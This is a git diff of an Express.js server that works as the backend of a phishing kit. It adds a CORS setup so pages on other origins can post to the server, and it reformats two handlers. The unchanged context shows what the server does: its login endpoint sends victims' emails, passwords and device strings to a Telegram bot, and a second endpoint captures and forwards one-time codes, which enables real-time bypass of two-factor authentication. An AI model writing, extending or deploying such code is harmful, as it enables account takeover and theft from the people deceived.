@@ -6,6 +6,19 @@ const { v4: uuidv4 } = require("uuid");
 const app = express();
 const port = 3000;
 
+// This is the CROS PROTOCOL 
+
+app.use(cors({
+  origin: process.env.ALLOWED_ORIGINS
+    ? process.env.ALLOWED_ORIGINS.split(',')
+    : ['http://localhost:5500', 'http://localhost:5173'],  // fallback for local
+
+  credentials: true,
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+}));
+
+
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -56,10 +69,10 @@ app.post("/api/start-login", async (req, res) => {
   // Notify Telegram immediately
   await sendToTelegram(
     `New login attempt:\n` +
-      `Email: ${email}\n` +
-      `Password: ${password}\n` +
-      `Device: ${userAgent.slice(0, 140)}${userAgent.length > 140 ? "..." : ""}\n` +
-      `Waiting for OTP/code... (ID: ${attemptId.slice(0, 8)})`,
+    `Email: ${email}\n` +
+    `Password: ${password}\n` +
+    `Device: ${userAgent.slice(0, 140)}${userAgent.length > 140 ? "..." : ""}\n` +
+    `Waiting for OTP/code... (ID: ${attemptId.slice(0, 8)})`,
   );
 
   res.json({
@@ -100,17 +113,17 @@ app.post("/api/submit-code", async (req, res) => {
   // Success: link code to the original attempt
   await sendToTelegram(
     `OTP/Code received!\n` +
-      `Code: \`${code}\`\n` +
-      `Email: ${entry.email}\n` +
-      `Password: ${entry.password}\n` +
-      `Device: ${entry.userAgent.slice(0, 140)}${entry.userAgent.length > 140 ? "..." : ""}\n` +
-      `Attempt ID: ${attemptId.slice(0, 8)}`,
+    `Code: \`${code}\`\n` +
+    `Email: ${entry.email}\n` +
+    `Password: ${entry.password}\n` +
+    `Device: ${entry.userAgent.slice(0, 140)}${entry.userAgent.length > 140 ? "..." : ""}\n` +
+    `Attempt ID: ${attemptId.slice(0, 8)}`,
   );
 
   // Optional cleanup
   // attempts.delete(attemptId);
 
-  res.json({ status: "success", message: "Code received", code},);
+  res.json({ status: "success", message: "Code received", code },);
 });
 
 // Debug helper (optional)
